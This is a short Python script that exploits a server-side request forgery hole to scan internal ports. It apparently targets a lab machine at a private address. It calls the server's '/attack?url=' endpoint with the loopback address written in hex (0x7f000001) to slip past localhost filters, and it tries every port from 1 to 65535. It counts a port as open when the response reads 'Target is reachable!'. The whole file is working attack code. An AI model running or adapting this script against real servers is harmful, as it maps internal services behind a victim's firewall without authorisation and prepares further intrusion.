import requests

#Host on port 8000
URL_BASE = "http://10.10.134.239:8000/attack"

#Hex for 127.0.0.1
HEX_LOCALHOST = "0x7f000001"

#String to identify a reachable target
STR_REACHABLE = "Target is reachable!"

#Main function
def main():
	#Variable for open ports
	open_ports = []

	print ("Running")
	#Runs the script for all system ports
	for port in range(1, 65536):

		url = get_url(port)

		#Get request to server
		response = requests.get(get_url(port))

		#Check if port is opened
		if (is_port_open(response)):
			open_ports.append(port)
			print("Port " + str(port) + " (OPENED!)")
		else:
			print("Port " + str(port) + " [Closed]")

	print(str(len(open_ports)) + " open port(s):")
	print(open_ports)


#Returns a payload for url attribute
def get_payload(port):
	return "http://" + HEX_LOCALHOST + ":" + str(port)

#Check in the response if the port is opened
def is_port_open(response):
	content = response.content.decode('utf-8')
	return content.find(STR_REACHABLE) != -1


#Get a url to GET request
def get_url(port):
	payload = get_payload(port)
	return URL_BASE + "?url=" + payload



if __name__ == "__main__":
	main()